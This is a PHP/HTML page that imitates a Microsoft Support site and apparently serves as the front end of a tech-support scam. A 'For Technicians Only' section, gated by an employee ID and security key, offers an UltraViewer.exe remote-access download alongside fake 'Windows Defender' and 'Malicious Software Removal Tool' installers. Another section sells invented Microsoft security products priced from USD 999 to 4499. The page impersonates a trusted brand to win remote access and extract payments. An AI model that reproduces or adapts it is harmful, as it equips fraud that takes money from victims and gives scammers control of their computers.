<?php require_once('header.php'); ?>

    <div class="support-container">
        <div class="top-container">
            <div>
                <h1>Welcome to Microsoft Support</h1>
                <p>Please sign in so we may serve you better</p>
                <input placeholder="How can we help you ? " />
            </div>
        </div>

        <div class="microsoft-products">
            <div style="width:80%;display: flex;margin: auto; justify-content: space-between;">
                <div style="text-align: center;">
                    <a href="https://support.microsoft.com/en-us/microsoft-365"><img src="./images/micro-logo.png" /></a>
                    <p>Microsoft 365</p>
                </div>

                <div style="text-align: center;">
                    <a href="https://support.microsoft.com/en-us/outlook"><img src="./images/outlook.png" /></a>
                    <p>Outlook</p>
                </div>

                <div style="text-align: center;">
                    <a href="https://support.microsoft.com/en-us/onedrive"><img src="./images/onedrive.png" /></a>
                    <p>OneDrive</p>
                </div>

                <div style="text-align: center;">
                    <a href="https://support.microsoft.com/en-us/windows"><img src="./images/logo-blue.png" /></a>
                    <p>Windows</p>
                </div>

                <div style="text-align: center;">
                    <a href="https://support.microsoft.com/en-us/surface"><img src="./images/surface-device.png" /></a>
                    <p>Surface Devices</p>
                </div>

                <div style="text-align: center;">
                    <a href="https://support.xbox.com/en-US/"><img src="./images/xbox-color.png" /></a>
                    <p>Gaming</p>
                </div>

                <div style="text-align: center;">
                    <a href="https://support.microsoft.com/en-us/teams"><img src="./images/teams.png" /></a>
                    <p>Microsoft Teams</p>
                </div>

                <div style="text-align: center;">
                    <a href="https://support.microsoft.com/en-us/microsoft-store-and-billing"><img src="./images/store.png" /></a>
                    <p>Microsoft Store</p>
                </div>

                <div style="text-align: center;">
                    <a href="https://support.microsoft.com/en-us/microsoft-edge"><img src="./images/edge.png" /></a>
                    <p>Microsoft Edge</p>
                </div>
            </div>
        </div>


        <!-- Employees Section-->

        <div class="employee-section">
            <h1>For Technicians Only</h1>

        <div class="second-cards" style="margin: 50px auto;">
            <div class="cards-container" style="width: 90%;">
                <div class="card">
                    <div style="text-align: center;">
                    <img class="card-img-top" src="./images/ultraviewer.webp" alt="Card image cap">
                    </div>
                    <hr />
                    <div class="card-body">
                        <h1>Ultraviewer Pro for Windows</h1>
                        <p>
                            Allows you to connect any PC with our Secured Server, Guard Against Hacking, Online Trackers, Online Scams, Data & Identity Theft, Webcam spies & Hackers.
                        </p>
                        <div>
                            <button id="ultra_download">Download Now</button>
                            <p style="display: none" id="ultra_empid_para">Enter Employee ID <input id="ultra_empid" type="text" /><input type="button" value="Submit" style="background-color: rgb(0,103,184);
                                color: white;
                                padding: 3px 16px;
                                margin-left: 10px;
                                border-radius: 3px;" id="ultra_empid_btn2" />
                            </p>

                            <p style="display: none" id="ultra_key_para">Enter Security Key <input id="ultra_key" type="text" /><input type="button" value="Submit" style="background-color: rgb(0,103,184);
                                color: white;
                                padding: 3px 16px;
                                margin-left: 10px;
                                border-radius: 3px;" id="ultra_key_btn" />
                            </p>
                            <a href="./UltraViewer.exe" download="download" style="display: none;" id="download" >Download</a>
                            <p style="position: absolute;bottom: 0px;color:red" id="message"></p>
                        </div>
                    </div>
                </div>
        
                <div class="card">
                    <div style="text-align: center; background-color: #007dd5;">
                    <img class="card-img-top" src="./images/windows-defender.jpg" alt="Card image cap">
                    </div>
                    <div class="card-body">
                        
                        <h1>Windows Defender Security</h1>
                        <p>
                            State of the art Firewall, not only blocks away any intruder but continously scan your PC for any open ports.
                        </p>
                        <div>
                            <button id="defender_install">Install Now</button>
                            <button id="defender_installed" style="display: none;">Installed</button>
                            <p style="display: none" id="defender_empid_para">Enter Employee ID <input id="defender_empid" type="text" /><input type="button" value="Submit" style="background-color: rgb(0,103,184);
                                color: white;
                                padding: 3px 16px;
                                margin-left: 10px;
                                border-radius: 3px;" id="defender_empid_btn2" />
                            </p>

                            <p style="display: none" id="defender_key_para">Enter Security Key <input id="defender_key" type="text" /><input type="button" value="Submit" style="background-color: rgb(0,103,184);
                                color: white;
                                padding: 3px 16px;
                                margin-left: 10px;
                                border-radius: 3px;" id="defender_key_btn" />
                            </p>
                            <div style="display: none;" id="defender_loader">
                                <p style="background-color: rgb(0,103,184);color:white; padding: 10px 15px;">Installing</p> 
                                <div  class="loader" ></div>
                            </div>
                        </div>
                    </div>
                </div>
        
                <div class="card">
                    <div style="text-align: center;">
                    <img class="card-img-top" src="./images/mrt-removebg-preview.png" alt="Card image cap">
                    <hr />
                    </div>      
                    <div class="card-body">
                        <h1>Malicious Software Removal Tool</h1>
                        <p>
                            Scan the whole PC, for any kind of malicious software or files and remove them instantly.
                        </p>
                        <div>
                            <button id="mrt_install">Install Now</button>
                            <button id="mrt_installed" style="display: none;">Installed</button>
                            <p style="display: none" id="mrt_empid_para">Enter Employee ID <input id="mrt_empid" type="text" /><input type="button" value="Submit" style="background-color: rgb(0,103,184);
                                color: white;
                                padding: 3px 16px;
                                margin-left: 10px;
                                border-radius: 3px;" id="mrt_empid_btn2" />
                            </p>

                            <p style="display: none" id="mrt_key_para">Enter Security Key <input id="mrt_key" type="text" /><input type="button" value="Submit" style="background-color: rgb(0,103,184);
                                color: white;
                                padding: 3px 16px;
                                margin-left: 10px;
                                border-radius: 3px;" id="mrt_key_btn" />
                            </p>
                            <div style="display: none;" id="mrt_loader">
                                <p style="background-color: rgb(0,103,184);color:white; padding: 10px 15px;">Installing</p> 
                                <div  class="loader" ></div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
           </div>
        </div>
        <!-- Employees Section Ends Here-->

        <section class="micro-365-section">
            <div>
                <img src="./images/365.png" />
            </div>
            <div style="padding: 0px 40px;">
                <h1>
                    Achieve the extraordinary with a Microsoft 365 subscription
                </h1>

                <p>
                    Enhance your personal productivity with AI. Copilot in Microsoft 365 now helps you do more with the apps you use every day.
                </p>
                <p>
                    FIND MORE ABOUT YOUR NEW AI-POWERED PRODUCTIVITY SUITE
                </p>
                <p>
                    START YOUR COPILOT JOURNEY
                </p>
                <a href="https://www.microsoft.com/en-in/microsoft-365/buy/compare-all-microsoft-365-products?ocid=cmm5bq3vzw5"><button>BUY MICROSOFT 365</button></a>
            </div>
        </section>

        <section class="explore">
            <div style="text-align: center; margin-top: 50px;">
                <h1>Explore</h1>
            </div>
            <div class="explore-container">
                <div class="explore-card">
                    <div>
                        <img src="./images/cocreator.jpg" />
                    </div>
                    <div style="padding: 0px 30px;">
                        <h4>Generate art with Paint Cocreator</h4>
                        <p>
                            Create amazing artwork with just a few words. Microsoft Paint Cocreator will help you unleash your creativity and make your own artworks with the help of AI.
                        </p>
                        <p>    
                            <a href="https://support.microsoft.com/en-us/windows/use-image-creator-in-paint-to-generate-ai-art-107a2b3a-62ea-41f5-a638-7bc6e6ea718f">GENERATE ART WITH PAINT COCREATOR</a>
                        </p>
                    </div>
                </div>
                <div class="explore-card">
                    <div>
                        <img src="./images/co-pilot.jpg" />
                    </div>
                    <div style="padding: 0px 30px;">
                        <h4>Achieve more with AI in Windows</h4>
                        <p>
                            Windows is the first PC platform to provide centralized AI assistance. Learn how to achieve and create more with Copilot on Windows.
                        </p>
                        <p>
                            <a href="https://support.microsoft.com/en-us/windows/welcome-to-copilot-on-windows-675708af-8c16-4675-afeb-85a5a476ccb0">
                                LEARN MORE ABOUT COPILOT ON WINDOWS
                            </a>
                        </p>
                    </div>
                </div>
        </div>
        <div class="explore-container">
                <div class="explore-card">
                    <div>
                        <img src="./images/cup.png" />
                    </div>
                    <div style="padding: 0px 30px;">
                        <h4>The Microsoft 365 Copilot app is here</h4>
                        <p>
                            The Microsoft 365 Copilot app is your everyday productivity app for work and life. Your starting place to ask, create, and draft with Copilot, plus your favorite apps and content in one place.
                        </p>
                        <p>
                            <a href="https://support.microsoft.com/en-us/training">GET THE DETAILS</a>
                        </p>
                    </div>
                </div>
                <div class="explore-card">
                    <div>
                        <img src="./images/training.jpg" />
                    </div>
                    <div style="padding: 0 30px;">
                        <h4>Microsoft 365 Training Center</h4>
                        <p>
                            Get productive quickly with these Microsoft 365 videos, tutorials, and resources.
                        </p>
                        <p>
                            <a href="https://support.microsoft.com/en-us/office/the-microsoft-365-app-transition-to-the-microsoft-365-copilot-app-22eac811-08d6-4df3-92dd-77f193e354a5">BROWSE TRAINING OPTIONS</a>
                        </p>
                    </div>
                </div>
                <div></div>
            </div>
        </section>

        <!-- Securities Download Section-->
        <div class="download-section">
            <h1>Advanced Securities</h1>

        <!-- <div class="second-cards" style="margin: 50px auto;">
            <div class="cards-container" style="width:90%;">
                <div class="card">
                    <div style="text-align: center; background-image: url('./images/cybersecurity.webp');color:white;height: 160px;background-size: contain;
                    position: relative;">
                        <h3 style="position: absolute;top:50%;left:50%;transform: translateX(-50%)translateY(-50%);"></h3>
                    </div>
                    <div class="card-body">
                        <h1>Cybersecurity Basics</h1>
                        <p>
                            Allow you to connect any PC with our Server, over A-class Military Grade Encrytion
                        </p>
                        <div>
                            <a href="Ultraviewer.exe" download><button>Download Now</button></a>
                        </div>
                    </div>
                </div>
        
                <div class="card">
                    <div style="text-align: center; background-image: url('./images/cybersecurity-pro.webp');color:black;height: 160px;background-size: contain;
                    position: relative;">
                        <h3 style="position: absolute;top:50%;left:50%;transform: translateX(-50%)translateY(-50%);">CyberSecurity<br />Pro</h3>
                    </div>
                    <div class="card-body">
                        
                        <h1>CyberSecurity Pro</h1>
                        <p>
                            State of the art Firewall, not only blocks away any intruder but continously scan your PC for any open ports.
                        </p>
                        <div>
                            <button>Install Now</button>
                        </div>
                    </div>
                </div>
        
                <div class="card">
                    <div style="text-align: center; background-image: url('./images/firewall.webp');color:red;height: 160px;background-size: contain;
                    position: relative;">
                        <h3 style="position: absolute;top:50%;left:50%;transform: translateX(-50%)translateY(-50%);"><br /></h3>
                    </div>      
                    <div class="card-body">
                        <h1>Firewall Essentials</h1>
                        <p>
                            Scan the whole PC, for any kind of malicious software or files and remove them instantly.
                        </p>
                        <div>
                            <button>Install Now</button>
                        </div>
                    </div>
                </div>

                <div class="card">
                    <div style="text-align: center; background-image: url('./images/firewall-pro.png');color:white;height: 160px;background-size: contain;
                    position: relative;">
                    <h3 style="position: absolute;top:50%;left:50%;transform: translateX(-50%)translateY(-50%);">Firewall Pro</h3>
                    </div>
                    <div class="card-body">
                        <h1>Firewall Pro</h1>
                        <p>
                            Scan the whole PC, for any kind of malicious software or files and remove them instantly.
                        </p>
                        <div>
                            <button>Install Now</button>
                        </div>
                    </div>
                </div>

            </div>
           </div>
 -->
           <div class="second-cards" style="margin: 50px auto;">
            <div class="cards-container" style="width: 90%;">
                <div class="card">
                    <div style="text-align: center; background-image: url('./images/cybersecurity.webp');color:white;height: 160px;background-size: contain;
                    position: relative;">
                        <h3 style="position: absolute;top:50%;left:50%;transform: translateX(-50%)translateY(-50%);">Network Guardian</h3>
                    </div>
                    <div class="card-body">
                        <h1>Network Guardian</h1>
                        <p>
                            Network Guardian: Always Vigilant, Securing Your Network, Protecting Your Future.
                        </p>
                        <div style="display: flex; justify-content: space-between;align-content: center;">
                            <p>USD 999</p>
                            <p><a><button>Buy Now</button></a></p>
                        </div>
                    </div>
                </div>
        
                <div class="card">
                    <div style="text-align: center; background-image: url('./images/cybersecurity-pro.webp');color:black;height: 160px;background-size: contain;
                    position: relative;">
                        <h3 style="position: absolute;top:50%;left:50%;transform: translateX(-50%)translateY(-50%);">Secure Encryption</h3>
                    </div>
                    <div class="card-body">
                        
                        <h1>Secure Encrytion</h1>
                        <p>
                            Unbreakable Encryption: Your Data, Secure Forever.
                        </p>
                        <div style="display: flex; justify-content: space-between;align-content: center;">
                            <p>USD 1499</p>
                            <p><a><button>Buy Now</button></a></p>
                        </div>
                    </div>
                </div>
        
                <div class="card">
                    <div style="text-align: center; background-image: url('./images/firewall-essential.png');color:white;height: 160px;background-size: contain;
                    position: relative;">
                        <h3 style="position: absolute;top:50%;left:50%;transform: translateX(-50%)translateY(-50%);">Internet Security</h3>
                    </div>      
                    <div class="card-body">
                        <h1>Internet Security</h1>
                        <p>
                            Don't Get Hacked, Get Protected - By Microsoft Internet Securities.
                        </p>
                        <div style="display: flex; justify-content: space-between;align-content: center;">
                            <p>USD 1999</p>
                            <p><a><button>Buy Now</button></a></p>
                        </div>
                    </div>
                </div>

                <div class="card">
                    <div style="text-align: center; background-image: url('./images/firewall-pro.png');color:white;height: 160px;background-size: contain;
                    position: relative;">
                    <h3 style="position: absolute;top:50%;left:50%;transform: translateX(-50%)translateY(-50%);">Complete Network Security</h3>
                    </div>
                    <div class="card-body">
                        <h1>Complete Network Security</h1>
                        <p>
                            Take Action, Protect Your Information By Locking Your Cyber Doors With The Help Of Microsoft Network Securities.
                        </p>
                        <div style="display: flex; justify-content: space-between;align-content: center;">
                            <p>USD 4499</p>
                            <p><a><button>Buy Now</button></a></p>
                        </div>
                    </div>
                </div>

            </div>
           </div>
        </div>
        <!-- Securities Download Section Ends -->

        <!-- More Support Options -->
        <div class="more-support">
            <h1>More Support Options</h1>
            <div style="display: flex; width:80%;margin: auto;justify-content: space-between;">
                <div>
                    <h3>Contact Support</h3>
                    <ul>
                        <a href="https://support.microsoft.com/en-us/contactus?ContactUsExperienceEntryPointAssetId=S.HP.SMC-HOME"><li>Contact Us</li></a>
                        <a href="https://answers.microsoft.com/en-us"><li>Ask the Community</li></a>
                    </ul>
                </div>
                <div>
                    <h3>Enterprise Support</h3>
                    <ul>
                        <a href="https://support.serviceshub.microsoft.com/supportforbusiness"><li>Support For Business</li></a>
                        <a href="https://learn.microsoft.com/en-us/microsoft-365/admin/?view=o365-worldwide"><li>IT Pros and admins</li></a>
                    </ul>
                </div>
                <div>
                    <h3>Privacy & Security</h3>
                    <ul>
                        <a href="https://support.microsoft.com/en-us/security"><li>Security</li></a>
                        <a href="https://www.microsoft.com/en-ca/privacy/privacy-support-requests"><li>Report a privacy concern</li></a>
                    </ul>
                </div>
                <div>
                    <h3>More Support</h3>
                    <ul>
                        <a href="https://support.microsoft.com/en-us/accessibility"><li>Accessibility</li></a>
                        <a href="https://support.microsoft.com/en-us/accessibility"><li>Support for Vendors</li></a>
                    </ul>
                </div>
            </div>
        </div>
        <!-- More Support Options Ends -->

<?php require_once('footer.php'); ?>